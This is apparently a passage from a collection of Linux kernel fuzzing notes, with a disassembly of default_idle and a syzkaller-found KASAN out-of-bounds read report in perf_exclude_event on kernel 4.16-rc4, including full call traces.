   0xffffffff821acb63 <+83>:	call   0xffffffff81124110 <debug_lockdep_rcu_enabled>
   0xffffffff821acb68 <+88>:	test   eax,eax
   0xffffffff821acb6a <+90>:	je     0xffffffff821acb79 <default_idle+105>
   0xffffffff821acb6c <+92>:	cmp    BYTE PTR [rip+0xba8f9b],0x0        # 0xffffffff82d55b0e <__warned.41319>
   0xffffffff821acb73 <+99>:	je     0xffffffff821acc22 <default_idle+274>
   0xffffffff821acb79 <+105>:	test   rbx,rbx
   0xffffffff821acb7c <+108>:	je     0xffffffff821acba1 <default_idle+145>
   0xffffffff821acb7e <+110>:	mov    rax,QWORD PTR [rbx]
   0xffffffff821acb81 <+113>:	mov    r12d,0xffffffff
   0xffffffff821acb87 <+119>:	mov    rdi,QWORD PTR [rbx+0x8]
   0xffffffff821acb8b <+123>:	add    rbx,0x18
   0xffffffff821acb8f <+127>:	mov    edx,ebp
   0xffffffff821acb91 <+129>:	mov    esi,r12d
   0xffffffff821acb94 <+132>:	call   0xffffffff82403000 <__x86_indirect_thunk_rax>
   0xffffffff821acb99 <+137>:	mov    rax,QWORD PTR [rbx]
   0xffffffff821acb9c <+140>:	test   rax,rax
   0xffffffff821acb9f <+143>:	jne    0xffffffff821acb87 <default_idle+119>
   0xffffffff821acba1 <+145>:	dec    DWORD PTR gs:[rip+0x7de68268]        # 0x14e10 <__preempt_count>
   0xffffffff821acba8 <+152>:	pop    rbx
   0xffffffff821acba9 <+153>:	pop    rbp
   0xffffffff821acbaa <+154>:	pop    r12
   0xffffffff821acbac <+156>:	jmp    0xffffffff8112fa80 <rcu_irq_exit_irqson>
   0xffffffff821acbb1 <+161>:	mov    eax,DWORD PTR gs:[rip+0x7de62578]        # 0xf130 <cpu_number>
   0xffffffff821acbb8 <+168>:	mov    eax,eax
   0xffffffff821acbba <+170>:	bt     QWORD PTR [rip+0xbf8ade],rax        # 0xffffffff82da56a0 <__cpu_online_mask>
   0xffffffff821acbc2 <+178>:	jae    0xffffffff821acb20 <default_idle+16>
   0xffffffff821acbc8 <+184>:	call   0xffffffff8112fef0 <rcu_irq_enter_irqson>
   0xffffffff821acbcd <+189>:	inc    DWORD PTR gs:[rip+0x7de6823c]        # 0x14e10 <__preempt_count>
   0xffffffff821acbd4 <+196>:	mov    rbx,QWORD PTR [rip+0xbad02d]        # 0xffffffff82d59c08 <__tracepoint_cpu_idle+40>
   0xffffffff821acbdb <+203>:	call   0xffffffff81124110 <debug_lockdep_rcu_enabled>
   0xffffffff821acbe0 <+208>:	test   eax,eax
   0xffffffff821acbe2 <+210>:	je     0xffffffff821acbed <default_idle+221>
   0xffffffff821acbe4 <+212>:	cmp    BYTE PTR [rip+0xba8f23],0x0        # 0xffffffff82d55b0e <__warned.41319>
   0xffffffff821acbeb <+219>:	je     0xffffffff821acc53 <default_idle+323>
   0xffffffff821acbed <+221>:	test   rbx,rbx
   0xffffffff821acbf0 <+224>:	je     0xffffffff821acc11 <default_idle+257>
   0xffffffff821acbf2 <+226>:	mov    rax,QWORD PTR [rbx]
   0xffffffff821acbf5 <+229>:	mov    rdi,QWORD PTR [rbx+0x8]
   0xffffffff821acbf9 <+233>:	add    rbx,0x18
   0xffffffff821acbfd <+237>:	mov    edx,ebp
   0xffffffff821acbff <+239>:	mov    esi,0x1
   0xffffffff821acc04 <+244>:	call   0xffffffff82403000 <__x86_indirect_thunk_rax>
   0xffffffff821acc09 <+249>:	mov    rax,QWORD PTR [rbx]
   0xffffffff821acc0c <+252>:	test   rax,rax
   0xffffffff821acc0f <+255>:	jne    0xffffffff821acbf5 <default_idle+229>
   0xffffffff821acc11 <+257>:	dec    DWORD PTR gs:[rip+0x7de681f8]        # 0x14e10 <__preempt_count>
   0xffffffff821acc18 <+264>:	call   0xffffffff8112fa80 <rcu_irq_exit_irqson>
   0xffffffff821acc1d <+269>:	jmp    0xffffffff821acb20 <default_idle+16>
   0xffffffff821acc22 <+274>:	call   0xffffffff811241a0 <rcu_read_lock_sched_held>
   0xffffffff821acc27 <+279>:	test   eax,eax
   0xffffffff821acc29 <+281>:	jne    0xffffffff821acb79 <default_idle+105>
   0xffffffff821acc2f <+287>:	mov    rdx,0xffffffff82920580
   0xffffffff821acc36 <+294>:	mov    esi,0x28
   0xffffffff821acc3b <+299>:	mov    rdi,0xffffffff82925778
   0xffffffff821acc42 <+306>:	mov    BYTE PTR [rip+0xba8ec5],0x1        # 0xffffffff82d55b0e <__warned.41319>
   0xffffffff821acc49 <+313>:	call   0xffffffff810f59ee <lockdep_rcu_suspicious>
   0xffffffff821acc4e <+318>:	jmp    0xffffffff821acb79 <default_idle+105>
   0xffffffff821acc53 <+323>:	call   0xffffffff811241a0 <rcu_read_lock_sched_held>
   0xffffffff821acc58 <+328>:	test   eax,eax
   0xffffffff821acc5a <+330>:	jne    0xffffffff821acbed <default_idle+221>
   0xffffffff821acc5c <+332>:	mov    rdx,0xffffffff82920580
   0xffffffff821acc63 <+339>:	mov    esi,0x28
   0xffffffff821acc68 <+344>:	mov    rdi,0xffffffff82925778
   0xffffffff821acc6f <+351>:	mov    BYTE PTR [rip+0xba8e98],0x1        # 0xffffffff82d55b0e <__warned.41319>
   0xffffffff821acc76 <+358>:	call   0xffffffff810f59ee <lockdep_rcu_suspicious>
   0xffffffff821acc7b <+363>:	jmp    0xffffffff821acbed <default_idle+221>
End of assembler dump.
```

Code :

```c
   0:   04 24                   add    al,0x24
   2:   e8 12 ee ed fd          call   0xfffffffffdedee19
   7:   48 8b 04 24             mov    rax,QWORD PTR [rsp]
   b:   e9 d6 fe ff ff          jmp    0xfffffffffffffee6
  10:   48 89 df                mov    rdi,rbx
  13:   e8 01 ee ed fd          call   0xfffffffffdedee19
  18:   eb 8a                   jmp    0xffffffffffffffa4
  1a:   90                      nop
  1b:   90                      nop
  1c:   90                      nop
  1d:   90                      nop
  1e:   90                      nop
  1f:   90                      nop
  20:   90                      nop
  21:   90                      nop
  22:   90                      nop
  23:   90                      nop
  24:   90                      nop
  25:   90                      nop
  26:   90                      nop
  27:   90                      nop
  28:   90                      nop
  29:   fb                      sti    
  2a:   f4                      hlt    
  2b:  *c3                      ret    
  2c:   0f 1f 00                nop    DWORD PTR [rax]
  2f:   66 2e 0f 1f 84 00 00    nop    WORD PTR cs:[rax+rax*1+0x0]
  36:   00 00 00 
  39:   f4                      hlt    
  3a:   c3                      ret    
  3b:   90                      nop
  3c:   90                      nop
  3d:   90                      nop
  3e:   90                      nop
  3f:   90                      nop
```

Maybe, in ```safe_halt()```, stuck for seconds because of ...

**End**


## perf_exclude_event - alloca Out Of Bounds

Got from syzkaller & Found in LK v4.16.0-rc4.

### Call Trace (Dump)

```c
[   45.867098] BUG: KASAN: alloca-out-of-bounds in perf_exclude_event+0x17e/0x190 kernel/events/core.c:7521
[   45.867976] Read of size 8 at addr ffff880022efeae0 by task syz-executor7/7812
[   45.868795] 
[   45.869000] CPU: 0 PID: 7812 Comm: syz-executor7 Not tainted 4.16.0-rc4 #6
[   45.869791] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[   45.870801] Call Trace:
[   45.871096]  <IRQ>
[   45.871352]  dump_stack+0x127/0x213
[   45.871771]  ? _atomic_dec_and_lock+0x18d/0x18d
[   45.872299]  ? show_regs_print_info+0x12/0x12
[   45.872816]  ? perf_exclude_event+0x17e/0x190
[   45.873337]  print_address_description+0x60/0x22b
[   45.873886]  ? perf_exclude_event+0x17e/0x190
[   45.874407]  kasan_report.cold.6+0xac/0x2f4
[   45.874913]  ? perf_exclude_event+0x17e/0x190
[   45.875437]  ? perf_swevent_hrtimer+0x28c/0x500
[   45.875970]  ? save_trace+0x300/0x300
[   45.876399]  ? scsi_finish_command+0x611/0x810
[   45.876920]  ? perf_iterate_ctx+0x420/0x420
[   45.877439]  ? save_trace+0x300/0x300
[   45.877870]  ? rcu_nmi_exit+0x742/0x970
[   45.878333]  ? find_held_lock+0x33/0x1b0
[   45.878824]  ? save_trace+0x300/0x300
[   45.879328]  ? save_trace+0x300/0x300
[   45.879918]  ? lock_acquire+0x4a0/0x4a0
[   45.880438]  ? save_trace+0x300/0x300
[   45.880882]  ? enqueue_hrtimer+0x171/0x500
[   45.881373]  ? do_raw_spin_trylock+0x190/0x190
[   45.881920]  ? save_trace+0x300/0x300
[   45.882369]  ? __lock_is_held+0xad/0x140
[   45.882860]  ? __hrtimer_run_queues+0x379/0x1000
[   45.883414]  ? perf_iterate_ctx+0x420/0x420
[   45.883907]  ? hrtimer_interrupt+0x10b/0x730
[   45.884432]  ? hrtimer_init+0x430/0x430
[   45.884889]  ? lock_downgrade+0x6d0/0x6d0
[   45.885382]  ? rcu_read_lock_sched_held+0x102/0x120
[   45.885958]  ? pvclock_read_flags+0x150/0x150
[   45.886476]  ? __lock_is_held+0xad/0x140
[   45.886952]  ? kvm_clock_read+0x21/0x30
[   45.887423]  ? ktime_get_update_offsets_now+0x324/0x400
[   45.888048]  ? do_timer+0x40/0x40
[   45.888449]  ? save_trace+0x300/0x300
[   45.888884]  ? rcu_read_lock_sched_held+0x102/0x120
[   45.889470]  ? hpet_assign_irq+0x1e0/0x1e0
[   45.889991]  ? hrtimer_interrupt+0x2e9/0x730
[   45.890512]  ? smp_apic_timer_interrupt+0x14d/0x710
[   45.891093]  ? smp_call_function_single_interrupt+0x660/0x660
[   45.891778]  ? handle_edge_irq+0x322/0x840
[   45.892270]  ? task_prio+0x50/0x50
[   45.892695]  ? _raw_spin_unlock+0x1f/0x30
[   45.893172]  ? trace_hardirqs_off_thunk+0x1a/0x1c
[   45.893767]  ? apic_timer_interrupt+0xf/0x20
[   45.894266]  </IRQ>
[   45.894546]  ? crypto_shash_update+0x23d/0x2a0
[   45.895075]  ? kasan_disable_current+0x20/0x20
[   45.895627]  ? crypto_shash_update+0x24d/0x2a0
[   45.896161]  ? ext4_inode_csum.isra.59+0x562/0xef0
[   45.896726]  ? ext4_journalled_zero_new_buffers+0x4e0/0x4e0
[   45.897421]  ? trace_hardirqs_on_thunk+0x1a/0x1c
[   45.897974]  ? retint_kernel+0x10/0x10
[   45.898434]  ? retint_kernel+0x10/0x10
[   45.898917]  ? trace_hardirqs_on_thunk+0x1a/0x1c
[   45.899470]  ? retint_kernel+0x10/0x10
[   45.899925]  ? ext4_inode_csum_set+0x17c/0x370
[   45.900450]  ? ext4_mark_iloc_dirty+0x1709/0x2cc0
[   45.901030]  ? ext4_chunk_trans_blocks+0x20/0x20
[   45.901578]  ? jbd2_journal_add_journal_head+0x3b0/0x560
[   45.902205]  ? jbd2_write_access_granted.part.8+0x264/0x410
[   45.902851]  ? jbd2_journal_write_metadata_buffer+0xf80/0xf80
[   45.903498]  ? rcu_note_context_switch+0x710/0x710
[   45.904022]  ? jbd2_journal_put_journal_head+0x3b1/0x54f
[   45.904594]  ? jbd2_journal_get_write_access+0x6b/0xb0
[   45.905153]  ? __ext4_journal_get_write_access+0x143/0x200
[   45.905795]  ? ext4_mark_inode_dirty+0x220/0xac0
[   45.906307]  ? ext4_dirty_inode+0x8d/0xb0
[   45.906776]  ? ext4_expand_extra_isize+0x560/0x560
[   45.907316]  ? __lock_is_held+0xad/0x140
[   45.907857]  ? ext4_setattr+0x2a90/0x2a90
[   45.908361]  ? __ext4_journal_start_sb+0x175/0x5d0
[   45.908950]  ? ext4_dirty_inode+0x5b/0xb0
[   45.909480]  ? ext4_journal_abort_handle.isra.4+0x250/0x250
[   45.910212]  ? __lock_is_held+0xad/0x140
[   45.910774]  ? ext4_setattr+0x2a90/0x2a90
[   45.911330]  ? ext4_dirty_inode+0x8d/0xb0
[   45.911855]  ? __mark_inode_dirty+0x798/0x1570
[   45.912431]  ? redirty_tail+0x200/0x200
[   45.912947]  ? preempt_schedule_common+0x1d/0x50
[   45.913551]  ? _cond_resched+0x18/0x20
[   45.914033]  ? filemap_fault+0x5bf/0x1c30
[   45.914555]  ? mark_held_locks+0xc1/0x140
[   45.915048]  ? retint_kernel+0x10/0x10
[   45.915536]  ? trace_hardirqs_on_thunk+0x1a/0x1c
[   45.916149]  ? retint_kernel+0x10/0x10
[   45.916662]  ? current_kernel_time64+0x189/0x200
[   45.917293]  ? current_kernel_time64+0x1a4/0x200
[   45.917909]  ? generic_update_time+0x26a/0x430
[   45.918426]  ? put_itimerspec64+0x2f0/0x2f0
[   45.918923]  ? dentry_needs_remove_privs.part.24+0x60/0x60
[   45.919546]  ? lock_acquire+0x1b3/0x4a0
[   45.920005]  ? dentry_needs_remove_privs.part.24+0x60/0x60
[   45.920639]  ? file_update_time+0x383/0x620
[   45.921172]  ? current_time+0xc0/0xc0
[   45.921646]  ? rcu_read_lock_sched_held+0x102/0x120
[   45.922306]  ? rcu_sync_lockdep_assert+0x6f/0xb0
[   45.922886]  ? __sb_start_write+0x171/0x2f0
[   45.923421]  ? ext4_page_mkwrite+0x1db/0x1320
[   45.923976]  ? futex_wake+0x6d0/0x6d0
[   45.924411]  ? ext4_change_inode_journal_flag+0x3f0/0x3f0
[   45.925015]  ? ext4_filemap_fault+0x75/0xa4
[   45.925552]  ? __down_interruptible+0x700/0x700
[   45.926145]  ? do_page_mkwrite+0x137/0x470
[   45.926673]  ? __do_fault+0x3f0/0x3f0
[   45.927169]  ? wake_up_page_bit+0x610/0x610
[   45.927745]  ? __handle_mm_fault+0x448/0x3940
[   45.928264]  ? __handle_mm_fault+0x1e62/0x3940
[   45.928808]  ? vm_insert_mixed_mkwrite+0x30/0x30
[   45.929363]  ? save_trace+0x300/0x300
[   45.929839]  ? find_held_lock+0x33/0x1b0
[   45.930336]  ? print_usage_bug+0x140/0x140
[   45.930820]  ? exit_robust_list+0x290/0x290
[   45.931322]  ? print_usage_bug+0x140/0x140
[   45.931790]  ? print_usage_bug+0x140/0x140
[   45.932317]  ? lock_acquire+0x4a0/0x4a0
[   45.932748]  ? lock_acquire+0x4a0/0x4a0
[   45.933213]  ? print_usage_bug+0x140/0x140
[   45.933748]  ? do_raw_spin_trylock+0x190/0x190
[   45.934293]  ? save_trace+0x300/0x300
[   45.934742]  ? mark_held_locks+0xc1/0x140
[   45.935224]  ? find_held_lock+0x33/0x1b0
[   45.935695]  ? retint_kernel+0x10/0x10
[   45.936147]  ? mark_held_locks+0xc1/0x140
[   45.936623]  ? retint_kernel+0x10/0x10
[   45.937106]  ? save_trace+0x300/0x300
[   45.937611]  ? mark_held_locks+0xc1/0x140
[   45.938192]  ? retint_kernel+0x10/0x10
[   45.938672]  ? trace_hardirqs_on_thunk+0x1a/0x1c
[   45.939215]  ? retint_kernel+0x10/0x10
[   45.939611]  ? handle_mm_fault+0x15a/0x410
[   45.940175]  ? __do_page_fault+0x672/0xe30
[   45.940700]  ? mm_fault_error+0x360/0x360
[   45.941258]  ? SyS_clock_settime+0x230/0x230
[   45.941801]  ? async_page_fault+0x2f/0x50
[   45.942153]  ? do_page_fault+0xc1/0x720
[   45.942536]  ? __do_page_fault+0xe30/0xe30
[   45.942955]  ? exit_to_usermode_loop+0x1c6/0x230
[   45.943435]  ? syscall_return_slowpath+0x4e0/0x4e0
[   45.943889]  ? syscall_return_slowpath+0x342/0x4e0
[   45.944351]  ? retint_user+0x18/0x18
[   45.944721]  ? async_page_fault+0x2f/0x50
[   45.945180]  ? trace_hardirqs_off_thunk+0x1a/0x1c
[   45.945734]  ? async_page_fault+0x2f/0x50
[   45.946290]  ? async_page_fault+0x45/0x50
[   45.946824] 
[   45.947035] The buggy address belongs to the page:
[   45.947726] page:ffffea00008bbf80 count:0 mapcount:0 mapping:0000000000000000 index:0x0
[   45.948791] flags: 0x100000000000000()
[   45.949241] raw: 0100000000000000 0000000000000000 0000000000000000 00000000ffffffff
[   45.950342] raw: 0000000000000000 dead000000000200 0000000000000000 0000000000000000
[   45.951364] page dumped because: kasan: bad access detected
[   45.952057] 
[   45.952367] Memory state around the buggy address:
[   45.953002]  ffff880022efe980: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[   45.953821]  ffff880022efea00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[   45.954860] >ffff880022efea80: 00 00 00 00 ca ca ca ca 02 cb cb cb cb cb cb cb
[   45.955823]                                                        ^
[   45.956398]  ffff880022efeb00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[   45.957172]  ffff880022efeb80: 00 00 00 f1 f1 f1 f1 02 f2 f2 f2 f2 f2 f2 f2 00
[   45.958089] ==================================================================
[   45.958800] Disabling lock debugging due to kernel taint
[   45.959376] Kernel panic - not syncing: panic_on_warn set ...
[   45.959376] 
[   45.959999] CPU: 0 PID: 7812 Comm: syz-executor7 Tainted: G    B            4.16.0-rc4 #6
[   45.960804] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.10.2-1ubuntu1 04/01/2014
[   45.961596] Call Trace:
[   45.961811]  <IRQ>
[   45.962030]  dump_stack+0x127/0x213
[   45.962440]  ? _atomic_dec_and_lock+0x18d/0x18d
[   45.962954]  panic+0x1f8/0x46f
[   45.963226]  ? add_taint.cold.5+0x16/0x16
[   45.963553]  ? add_taint+0x21/0x50
[   45.963825]  ? perf_exclude_event+0x17e/0x190
[   45.964222]  kasan_end_report+0x43/0x49
[   45.964525]  kasan_report.cold.6+0xc8/0x2f4
[   45.964911]  ? perf_exclude_event+0x17e/0x190
[   45.965295]  ? perf_swevent_hrtimer+0x28c/0x500
[   45.965795]  ? save_trace+0x300/0x300
[   45.966188]  ? scsi_finish_command+0x611/0x810
[   45.966716]  ? perf_iterate_ctx+0x420/0x420
[   45.967079]  ? save_trace+0x300/0x300
[   45.967399]  ? rcu_nmi_exit+0x742/0x970
[   45.967797]  ? find_held_lock+0x33/0x1b0
[   45.968138]  ? save_trace+0x300/0x300
[   45.968501]  ? save_trace+0x300/0x300
[   45.968824]  ? lock_acquire+0x4a0/0x4a0
[   45.969160]  ? save_trace+0x300/0x300
[   45.969534]  ? enqueue_hrtimer+0x171/0x500
[   45.969893]  ? do_raw_spin_trylock+0x190/0x190
[   45.970309]  ? save_trace+0x300/0x300
[   45.970656]  ? __lock_is_held+0xad/0x140
[   45.970999]  ? __hrtimer_run_queues+0x379/0x1000
[   45.971508]  ? perf_iterate_ctx+0x420/0x420
[   45.971873]  ? hrtimer_interrupt+0x10b/0x730
[   45.972324]  ? hrtimer_init+0x430/0x430
[   45.972663]  ? lock_downgrade+0x6d0/0x6d0
[   45.973047]  ? rcu_read_lock_sched_held+0x102/0x120
[   45.973472]  ? pvclock_read_flags+0x150/0x150
[   45.973889]  ? __lock_is_held+0xad/0x140
[   45.974284]  ? kvm_clock_read+0x21/0x30
[   45.974686]  ? ktime_get_update_offsets_now+0x324/0x400
[   45.975245]  ? do_timer+0x40/0x40
[   45.975596]  ? save_trace+0x300/0x300
[   45.976009]  ? rcu_read_lock_sched_held+0x102/0x120
[   45.976572]  ? hpet_assign_irq+0x1e0/0x1e0
[   45.976989]  ? hrtimer_interrupt+0x2e9/0x730
[   45.977367]  ? smp_apic_timer_interrupt+0x14d/0x710
[   45.977947]  ? smp_call_function_single_interrupt+0x660/0x660
[   45.978485]  ? handle_edge_irq+0x322/0x840
[   45.978808]  ? task_prio+0x50/0x50
[   45.979078]  ? _raw_spin_unlock+0x1f/0x30
[   45.979487]  ? trace_hardirqs_off_thunk+0x1a/0x1c
[   45.979981]  ? apic_timer_interrupt+0xf/0x20
[   45.980424]  </IRQ>
[   45.980611]  ? crypto_shash_update+0x23d/0x2a0
[   45.980950]  ? kasan_disable_current+0x20/0x20
[   45.981380]  ? crypto_shash_update+0x24d/0x2a0
[   45.981765]  ? ext4_inode_csum.isra.59+0x562/0xef0
[   45.982281]  ? ext4_journalled_zero_new_buffers+0x4e0/0x4e0
[   45.982830]  ? trace_hardirqs_on_thunk+0x1a/0x1c
[   45.983316]  ? retint_kernel+0x10/0x10
[   45.983706]  ? retint_kernel+0x10/0x10
[   45.984134]  ? trace_hardirqs_on_thunk+0x1a/0x1c
[   45.984642]  ? retint_kernel+0x10/0x10
[   45.985038]  ? ext4_inode_csum_set+0x17c/0x370
[   45.985499]  ? ext4_mark_iloc_dirty+0x1709/0x2cc0
[   45.986034]  ? ext4_chunk_trans_blocks+0x20/0x20
[   45.986437]  ? jbd2_journal_add_journal_head+0x3b0/0x560
[   45.987001]  ? jbd2_write_access_granted.part.8+0x264/0x410
[   45.987726]  ? jbd2_journal_write_metadata_buffer+0xf80/0xf80
[   45.988386]  ? rcu_note_context_switch+0x710/0x710
[   45.988941]  ? jbd2_journal_put_journal_head+0x3b1/0x54f
[   45.989555]  ? jbd2_journal_get_write_access+0x6b/0xb0
[   45.990150]  ? __ext4_journal_get_write_access+0x143/0x200
[   45.990780]  ? ext4_mark_inode_dirty+0x220/0xac0
[   45.991317]  ? ext4_dirty_inode+0x8d/0xb0
[   45.991783]  ? ext4_expand_extra_isize+0x560/0x560
[   45.992336]  ? __lock_is_held+0xad/0x140
[   45.992794]  ? ext4_setattr+0x2a90/0x2a90
[   45.993266]  ? __ext4_journal_start_sb+0x175/0x5d0
[   45.993818]  ? ext4_dirty_inode+0x5b/0xb0
[   45.994288]  ? ext4_journal_abort_handle.isra.4+0x250/0x250
[   45.994930]  ? __lock_is_held+0xad/0x140
[   45.995391]  ? ext4_setattr+0x2a90/0x2a90
[   45.995860]  ? ext4_dirty_inode+0x8d/0xb0
[   45.996326]  ? __mark_inode_dirty+0x798/0x1570
[   45.996841]  ? redirty_tail+0x200/0x200
[   45.997294]  ? preempt_schedule_common+0x1d/0x50
[   45.997851]  ? _cond_resched+0x18/0x20
[   45.998289]  ? filemap_fault+0x5bf/0x1c30
[   45.998728]  ? mark_held_locks+0xc1/0x140
[   45.999165]  ? retint_kernel+0x10/0x10
[   45.999571]  ? trace_hardirqs_on_thunk+0x1a/0x1c
[   46.000071]  ? retint_kernel+0x10/0x10
[   46.000479]  ? current_kernel_time64+0x189/0x200
[   46.000977]  ? current_kernel_time64+0x1a4/0x200
[   46.001484]  ? generic_update_time+0x26a/0x430
[   46.001959]  ? put_itimerspec64+0x2f0/0x2f0
[   46.002414]  ? dentry_needs_remove_privs.part.24+0x60/0x60
[   46.003026]  ? lock_acquire+0x1b3/0x4a0
[   46.003463]  ? dentry_needs_remove_privs.part.24+0x60/0x60
[   46.004050]  ? file_update_time+0x383/0x620
[   46.004511]  ? current_time+0xc0/0xc0
[   46.004927]  ? rcu_read_lock_sched_held+0x102/0x120
[   46.005492]  ? rcu_sync_lockdep_assert+0x6f/0xb0
[   46.006020]  ? __sb_start_write+0x171/0x2f0
[   46.006505]  ? ext4_page_mkwrite+0x1db/0x1320
[   46.007011]  ? futex_wake+0x6d0/0x6d0
[   46.007444]  ? ext4_change_inode_journal_flag+0x3f0/0x3f0
[   46.008083]  ? ext4_filemap_fault+0x75/0xa4
[   46.008564]  ? __down_interruptible+0x700/0x700
[   46.009079]  ? do_page_mkwrite+0x137/0x470
[   46.009532]  ? __do_fault+0x3f0/0x3f0
[   46.009938]  ? wake_up_page_bit+0x610/0x610
[   46.010420]  ? __handle_mm_fault+0x448/0x3940
[   46.010910]  ? __handle_mm_fault+0x1e62/0x3940
[   46.011389]  ? vm_insert_mixed_mkwrite+0x30/0x30
[   46.011915]  ? save_trace+0x300/0x300
[   46.012341]  ? find_held_lock+0x33/0x1b0
[   46.012772]  ? print_usage_bug+0x140/0x140
[   46.013216]  ? exit_robust_list+0x290/0x290
[   46.013701]  ? print_usage_bug+0x140/0x140
[   46.014177]  ? print_usage_bug+0x140/0x140
[   46.014634]  ? lock_acquire+0x4a0/0x4a0
[   46.015048]  ? lock_acquire+0x4a0/0x4a0
[   46.015463]  ? print_usage_bug+0x140/0x140
[   46.015904]  ? do_raw_spin_trylock+0x190/0x190
[   46.016383]  ? save_trace+0x300/0x300
[   46.016784]  ? mark_held_locks+0xc1/0x140
[   46.017230]  ? find_held_lock+0x33/0x1b0
[   46.017678]  ? retint_kernel+0x10/0x10
[   46.018163]  ? mark_held_locks+0xc1/0x140
[   46.018618]  ? retint_kernel+0x10/0x10
[   46.019038]  ? save_trace+0x300/0x300
[   46.019464]  ? mark_held_locks+0xc1/0x140
[   46.019913]  ? retint_kernel+0x10/0x10
[   46.020311]  ? trace_hardirqs_on_thunk+0x1a/0x1c
[   46.020782]  ? retint_kernel+0x10/0x10
[   46.021192]  ? handle_mm_fault+0x15a/0x410
[   46.021711]  ? __do_page_fault+0x672/0xe30
[   46.022230]  ? mm_fault_error+0x360/0x360
[   46.022738]  ? SyS_clock_settime+0x230/0x230
[   46.023278]  ? async_page_fault+0x2f/0x50
[   46.023782]  ? do_page_fault+0xc1/0x720
[   46.024267]  ? __do_page_fault+0xe30/0xe30
[   46.024782]  ? exit_to_usermode_loop+0x1c6/0x230
[   46.025326]  ? syscall_return_slowpath+0x4e0/0x4e0
[   46.025880]  ? syscall_return_slowpath+0x342/0x4e0
[   46.026432]  ? retint_user+0x18/0x18
[   46.026854]  ? async_page_fault+0x2f/0x50
[   46.027320]  ? trace_hardirqs_off_thunk+0x1a/0x1c
[   46.027912]  ? async_page_fault+0x2f/0x50
[   46.028432]  ? async_page_fault+0x45/0x50
[   46.029012] Dumping ftrace buffer:
[   46.029472]    (ftrace buffer empty)
[   46.029930] Kernel Offset: 0x25a00000 from 0xffffffff81000000 (relocation range: 0xffffffff80000000-0xffffffffbfffffff)
[   46.031275] Rebooting in 86400 seconds..
```

**End**

